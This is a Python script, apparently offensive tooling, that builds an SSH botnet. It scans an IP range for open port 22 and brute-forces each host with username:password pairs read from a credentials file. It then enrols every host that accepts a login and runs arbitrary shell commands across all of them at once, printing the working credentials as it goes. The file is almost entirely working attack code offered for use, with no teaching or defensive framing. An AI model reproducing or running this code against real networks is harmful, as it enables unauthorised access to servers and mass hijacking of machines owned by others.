import ipaddress
import socket
from pexpect import pxssh


def check_port(ip, port=22, timeout=0.05):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as a_socket:
        a_socket.settimeout(timeout)
        result = a_socket.connect_ex((ip, port))
        if result == 0:
            return True
        else:
            return False


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print(f'[+] Successful login to {self.host} with {self.user}:{self.password}')
            return s
        except pxssh.ExceptionPxssh as e:
            return None

    def send_command(self, cmd):
        if self.session:
            self.session.sendline(cmd)
            self.session.prompt()
            return self.session.before
        return b''


class Botnet:
    def __init__(self):
        self.clients = []

    def execute(self, command):
        for client in self.clients:
            output = client.send_command(command)
            print(f'[*] Output from {client.host}: {output.decode("utf-8")}')

    def add_client(self, host, user, password):
        if check_port(host):
            client = Client(host, user, password)
            if client.session:
                self.clients.append(client)
                return True
        return False

    def gather_bots(self, ip_range, credentials_file):
        network = ipaddress.ip_network(ip_range)
        valid_credentials = []
        with open(credentials_file, 'r') as file:
            credentials = [line.strip().split(':') for line in file]

        for ip in network.hosts():
            ip_str = str(ip)
            if check_port(ip_str, 22):
                for user, password in credentials:
                    if self.add_client(ip_str, user, password):
                        valid_credentials.append((ip_str, user, password))
                        break

        if valid_credentials:
            print("[+] Valid credentials found:")
            for ip, user, passw in valid_credentials:
                print(f"    - {ip} with {user}:{passw}")
            print(f"[+] {len(valid_credentials) }Bots added successfully.")
        else:
            print("[-] No valid credentials found.")

    def list_bots(self):
        if self.clients:
            print("[+] Listing connected bots:")
            for client in self.clients:
                print(f"    - {client.host} as {client.user}")
        else:
            print("[-] No bots connected.")